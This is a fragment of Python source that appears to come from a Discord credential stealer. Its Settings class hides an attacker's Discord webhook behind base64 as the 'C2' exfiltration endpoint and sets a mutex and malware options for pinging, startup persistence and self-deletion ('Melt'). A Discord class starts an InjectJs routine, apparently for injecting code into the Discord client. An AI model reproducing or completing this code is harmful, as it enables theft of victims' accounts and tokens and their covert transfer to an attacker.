...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNDQ5MDI0MzkxMDUzMzE3Mi9jZVpOSExfbGZwTkNTTDRNRjRIYlJfbDdjYW0tUTJTeGMzaFNMN2lSQWlBOEtOTDlUWjhlMHlnUWZuWjlLU2FmWFF4Uw==').decode())
    Mutex = base64.b64decode('OWJKZ0ZERUtZQVJNVGp3aw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
...
class Discord:
    ...
    @staticmethod
    def InjectJs() -> str | None: # type: ignore
        check = False
        try:
